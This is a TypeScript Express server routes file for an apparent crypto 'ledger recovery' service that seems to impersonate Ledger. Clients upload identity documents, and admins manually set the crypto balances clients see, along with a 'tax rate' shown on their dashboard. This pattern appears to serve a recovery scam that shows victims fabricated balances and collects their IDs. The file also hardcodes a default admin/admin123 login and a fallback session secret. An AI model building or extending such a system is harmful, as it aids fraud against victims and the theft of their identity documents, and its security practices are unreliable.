import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { auditMiddleware, logAdminLogin, logAdminLogout } from "./audit";
import bcrypt from "bcrypt";
import multer from "multer";
import path from "path";
import fs from "fs";
import { clientLoginSchema, adminLoginSchema, onboardingSchema } from "@shared/schema";
import { z } from "zod";
import session from "express-session";
import MemoryStore from "memorystore";

// Configure multer for KYC file uploads
const uploadDir = path.join(process.cwd(), "uploads", "kyc");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const upload = multer({
  dest: uploadDir,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only JPG, PNG, and PDF are allowed.'));
    }
  },
});

declare module 'express-session' {
  interface SessionData {
    userId?: number;
    userType?: 'client' | 'admin';
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Session middleware
  app.use(session({
    secret: process.env.SESSION_SECRET || 'ledger-recovery-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false, // Set to true if using HTTPS
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
  }));

  // Middleware to check authentication
  const requireAuth = (userType?: 'client' | 'admin') => {
    return (req: any, res: any, next: any) => {
      if (!req.session.userId) {
        return res.status(401).json({ message: 'Not authenticated' });
      }
      if (userType && req.session.userType !== userType) {
        return res.status(403).json({ message: 'Access denied' });
      }
      next();
    };
  };

  // Client authentication routes
  app.post('/api/client/login', async (req, res) => {
    try {
      const { email, password } = clientLoginSchema.parse(req.body);
      
      const client = await storage.getClientByEmail(email);
      if (!client) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const isValidPassword = await bcrypt.compare(password, client.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      // Update last connection
      await storage.updateClient(client.id, {
        lastConnection: new Date(),
        lastIp: req.ip || req.connection.remoteAddress || 'unknown'
      });

      req.session.userId = client.id;
      req.session.userType = 'client';

      res.json({ 
        user: { 
          id: client.id, 
          email: client.email,
          onboardingCompleted: client.onboardingCompleted,
          kycCompleted: client.kycCompleted
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  app.post('/api/client/register', async (req, res) => {
    try {
      const { email, password } = clientLoginSchema.parse(req.body);
      
      const existingClient = await storage.getClientByEmail(email);
      if (existingClient) {
        return res.status(400).json({ message: 'Email already exists' });
      }

      const hashedPassword = await bcrypt.hash(password, 10);
      const client = await storage.createClient({
        email,
        password: hashedPassword,
      });

      req.session.userId = client.id;
      req.session.userType = 'client';

      res.json({ 
        user: { 
          id: client.id, 
          email: client.email,
          onboardingCompleted: client.onboardingCompleted,
          kycCompleted: client.kycCompleted
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client onboarding
  app.post('/api/client/onboarding', requireAuth('client'), upload.single('kycFile'), async (req, res) => {
    try {
      const userId = req.session.userId!;
      const { amount } = req.body;

      const client = await storage.getClient(userId);
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }

      if (client.onboardingCompleted) {
        return res.status(400).json({ message: 'Onboarding already completed' });
      }

      let kycFileName = null;
      if (req.file) {
        const fileExtension = path.extname(req.file.originalname);
        kycFileName = `${client.email}-${Date.now()}${fileExtension}`;
        const finalPath = path.join(uploadDir, kycFileName);
        fs.renameSync(req.file.path, finalPath);
      }

      await storage.updateClient(userId, {
        amount: parseInt(amount),
        kycFileName,
        kycCompleted: !!req.file,
        onboardingCompleted: true,
      });

      res.json({ message: 'Onboarding completed successfully' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client dashboard data
  app.get('/api/client/dashboard', requireAuth('client'), async (req, res) => {
    try {
      const userId = req.session.userId!;
      const client = await storage.getClient(userId);
      
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }

      // Get crypto prices from CoinGecko
      const cryptoPrices = await fetchCryptoPrices();
      
      // Get global tax rate
      const taxSetting = await storage.getSetting('globalTax');
      const taxRate = taxSetting ? parseFloat(taxSetting.value) : 15;

      res.json({
        client: {
          email: client.email,
          balances: client.balances,
          amount: client.amount,
        },
        cryptoPrices,
        taxRate,
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Admin authentication routes
  app.post('/api/admin/login', async (req, res) => {
    try {
      const { email, password } = adminLoginSchema.parse(req.body);
      
      const admin = await storage.getAdminByEmail(email);
      if (!admin) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const isValidPassword = await bcrypt.compare(password, admin.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      req.session.userId = admin.id;
      req.session.userType = 'admin';

      // Log admin login
      await logAdminLogin(admin.id, req);

      res.json({ 
        user: { 
          id: admin.id, 
          email: admin.email,
          type: 'admin'
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Admin dashboard data
  app.get('/api/admin/dashboard', requireAuth('admin'), auditMiddleware('dashboard_view', 'system'), async (req, res) => {
    try {
      const clients = await storage.getAllClients();
      const taxSetting = await storage.getSetting('globalTax');
      const taxRate = taxSetting ? parseFloat(taxSetting.value) : 15;

      res.json({
        clients: clients.map(client => ({
          id: client.id,
          email: client.email,
          kycCompleted: client.kycCompleted,
          onboardingCompleted: client.onboardingCompleted,
          amount: client.amount,
          lastConnection: client.lastConnection,
          lastIp: client.lastIp,
          balances: client.balances,
          kycFileName: client.kycFileName,
        })),
        taxRate,
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update tax rate
  app.post('/api/admin/tax', requireAuth('admin'), auditMiddleware('tax_rate_update', 'system'), async (req, res) => {
    try {
      const { taxRate } = req.body;
      
      if (typeof taxRate !== 'number' || taxRate < 0 || taxRate > 50) {
        return res.status(400).json({ message: 'Invalid tax rate' });
      }

      await storage.setSetting({
        key: 'globalTax',
        value: taxRate.toString(),
      });

      res.json({ message: 'Tax rate updated successfully' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client notes
  app.get('/api/admin/client/:clientId/notes', requireAuth('admin'), auditMiddleware('client_notes_view', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const notes = await storage.getNotesForClient(clientId);
      res.json({ notes });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  app.post('/api/admin/client/:clientId/notes', requireAuth('admin'), auditMiddleware('client_note_add', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const adminId = req.session.userId!;
      const { note } = req.body;

      if (!note || note.trim().length === 0) {
        return res.status(400).json({ message: 'Note cannot be empty' });
      }

      const adminNote = await storage.createAdminNote({
        clientId,
        adminId,
        note: note.trim(),
      });

      res.json({ note: adminNote });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Download KYC file
  app.get('/api/admin/client/:clientId/kyc', requireAuth('admin'), auditMiddleware('kyc_file_view', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const client = await storage.getClient(clientId);
      
      if (!client || !client.kycFileName) {
        return res.status(404).json({ message: 'KYC file not found' });
      }

      const filePath = path.join(uploadDir, client.kycFileName);
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ message: 'KYC file not found on disk' });
      }

      res.download(filePath, client.kycFileName);
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Export clients CSV
  app.get('/api/admin/export', requireAuth('admin'), auditMiddleware('data_export', 'system'), async (req, res) => {
    try {
      const clients = await storage.getAllClients();
      
      const csvHeader = 'Email,KYC Completed,Onboarding Completed,Amount,Last Connection,Last IP,BTC Balance,ETH Balance,USDT Balance\n';
      const csvData = clients.map(client => {
        const balances = client.balances || { btc: 0, eth: 0, usdt: 0 };
        return [
          client.email,
          client.kycCompleted ? 'Yes' : 'No',
          client.onboardingCompleted ? 'Yes' : 'No',
          client.amount || 0,
          client.lastConnection ? client.lastConnection.toISOString() : 'Never',
          client.lastIp || 'Unknown',
          balances.btc,
          balances.eth,
          balances.usdt,
        ].join(',');
      }).join('\n');

      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="ledger-clients-${new Date().toISOString().split('T')[0]}.csv"`);
      res.send(csvHeader + csvData);
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Current user info
  app.get('/api/auth/me', async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ message: 'Not authenticated' });
    }

    try {
      if (req.session.userType === 'client') {
        const client = await storage.getClient(req.session.userId);
        if (client) {
          return res.json({
            user: {
              id: client.id,
              email: client.email,
              type: 'client',
              onboardingCompleted: client.onboardingCompleted,
              kycCompleted: client.kycCompleted,
            }
          });
        }
      } else if (req.session.userType === 'admin') {
        const admin = await storage.getAdmin(req.session.userId);
        if (admin) {
          return res.json({
            user: {
              id: admin.id,
              email: admin.email,
              type: 'admin',
            }
          });
        }
      }

      res.status(404).json({ message: 'User not found' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Audit trail endpoint
  app.get('/api/admin/audit-logs', requireAuth('admin'), async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 100;
      const adminId = req.query.adminId ? parseInt(req.query.adminId as string) : undefined;
      
      const auditLogs = await storage.getAuditLogs(adminId, limit);
      
      res.json({ auditLogs });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client status (active/inactive)
  app.post('/api/admin/client/:id/status', requireAuth('admin'), auditMiddleware('client_status_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { isActive } = req.body;
      
      const updatedClient = await storage.updateClient(clientId, { isActive });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      res.json({ message: 'Client status updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client risk level
  app.post('/api/admin/client/:id/risk', requireAuth('admin'), auditMiddleware('client_risk_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { riskLevel } = req.body;
      
      if (!['low', 'medium', 'high'].includes(riskLevel)) {
        return res.status(400).json({ message: 'Invalid risk level' });
      }
      
      const updatedClient = await storage.updateClient(clientId, { riskLevel });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      res.json({ message: 'Client risk level updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client balances
  app.post('/api/admin/client/:id/balances', requireAuth('admin'), auditMiddleware('client_balances_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { balances } = req.body;
      
      const updatedClient = await storage.updateClient(clientId, { balances });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      res.json({ message: 'Client balances updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Reset client password
  app.post('/api/admin/client/:id/reset-password', requireAuth('admin'), auditMiddleware('client_password_reset', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const newPassword = 'temp' + Math.random().toString(36).substring(2, 8);
      const hashedPassword = await bcrypt.hash(newPassword, 10);
      
      const updatedClient = await storage.updateClient(clientId, { password: hashedPassword });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      res.json({ message: 'Password reset successfully', temporaryPassword: newPassword });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Bulk operations endpoint
  app.post('/api/admin/bulk-operations', requireAuth('admin'), auditMiddleware('bulk_operations', 'system'), async (req, res) => {
    try {
      const { operation, clientIds } = req.body;
      
      if (!operation || !Array.isArray(clientIds) || clientIds.length === 0) {
        return res.status(400).json({ message: 'Invalid operation or client IDs' });
      }

      const results = [];
      const errors = [];

      for (const clientId of clientIds) {
        try {
          let result;
          
          switch (operation) {
            case 'activate':
              result = await storage.updateClient(clientId, { isActive: true });
              break;
            case 'deactivate':
              result = await storage.updateClient(clientId, { isActive: false });
              break;
            case 'reset_password':
              const newPassword = 'temp' + Math.random().toString(36).substring(2, 8);
              const hashedPassword = await bcrypt.hash(newPassword, 10);
              result = await storage.updateClient(clientId, { password: hashedPassword });
              if (result) {
                result.temporaryPassword = newPassword;
              }
              break;
            case 'set_risk_low':
              result = await storage.updateClient(clientId, { riskLevel: 'low' });
              break;
            case 'set_risk_medium':
              result = await storage.updateClient(clientId, { riskLevel: 'medium' });
              break;
            case 'set_risk_high':
              result = await storage.updateClient(clientId, { riskLevel: 'high' });
              break;
            default:
              throw new Error(`Unsupported operation: ${operation}`);
          }

          if (result) {
            results.push({ clientId, success: true, result });
          } else {
            errors.push({ clientId, error: 'Client not found' });
          }
        } catch (error: any) {
          errors.push({ clientId, error: error.message });
        }
      }

      res.json({
        message: 'Bulk operation completed',
        results,
        errors,
        summary: {
          total: clientIds.length,
          successful: results.length,
          failed: errors.length
        }
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Logout with audit trail
  app.post('/api/auth/logout', async (req, res) => {
    try {
      if (req.session.userId && req.session.userType === 'admin') {
        await logAdminLogout(req.session.userId, req);
      }
      
      req.session.destroy((err) => {
        if (err) {
          return res.status(500).json({ message: 'Could not log out' });
        }
        res.json({ message: 'Logged out successfully' });
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Initialize default admin if none exists
  initializeDefaultData();

  const httpServer = createServer(app);
  return httpServer;
}

// Fetch crypto prices from CoinGecko
async function fetchCryptoPrices() {
  try {
    const response = await fetch(
      'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,cardano,polkadot,solana,chainlink,polygon,binancecoin,ripple&vs_currencies=usd'
    );
    
    if (!response.ok) {
      throw new Error('Failed to fetch crypto prices');
    }
    
    const data = await response.json();
    return {
      bitcoin: data.bitcoin?.usd || 45000,
      ethereum: data.ethereum?.usd || 2500,
      tether: data.tether?.usd || 1,
      cardano: data.cardano?.usd || 0.5,
      polkadot: data.polkadot?.usd || 8,
      solana: data.solana?.usd || 65,
      chainlink: data.chainlink?.usd || 15,
      polygon: data.polygon?.usd || 0.9,
      binancecoin: data.binancecoin?.usd || 300,
      ripple: data.ripple?.usd || 0.6,
    };
  } catch (error) {
    console.error('Error fetching crypto prices:', error);
    // Return default values if API fails
    return {
      bitcoin: 45000,
      ethereum: 2500,
      tether: 1,
      cardano: 0.5,
      polkadot: 8,
      solana: 65,
      chainlink: 15,
      polygon: 0.9,
      binancecoin: 300,
      ripple: 0.6,
    };
  }
}

// Initialize default admin and settings
async function initializeDefaultData() {
  try {
    // Add delay for database connection stability
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Create default admin if none exists
    const existingAdmin = await storage.getAdminByEmail('admin@ledger.com');
    if (!existingAdmin) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      await storage.createAdmin({
        email: 'admin@ledger.com',
        password: hashedPassword,
      });
      console.log('Default admin created: admin@ledger.com / admin123');
    }

    // Create demo client if none exists
    const existingClient = await storage.getClientByEmail('client@demo.com');
    if (!existingClient) {
      const hashedPassword = await bcrypt.hash('demo123', 10);
      const client = await storage.createClient({
        email: 'client@demo.com',
        password: hashedPassword,
        amount: 50000,
        balances: { 
          btc: 0.5, 
          eth: 2.3, 
          usdt: 1500, 
          ada: 1200, 
          dot: 18, 
          sol: 8, 
          link: 65, 
          matic: 2000,
          bnb: 6.2,
          xrp: 2800
        },
      });
      
      // Update the client to mark onboarding complete
      await storage.updateClient(client.id, {
        onboardingCompleted: true,
        kycCompleted: true,
      });
      console.log('Demo client created: client@demo.com / demo123');
    }

    // Set default tax rate if not exists
    const taxSetting = await storage.getSetting('globalTax');
    if (!taxSetting) {
      await storage.setSetting({
        key: 'globalTax',
        value: '15',
      });
    }
  } catch (error) {
    console.error('Error initializing default data:', error);
  }
}
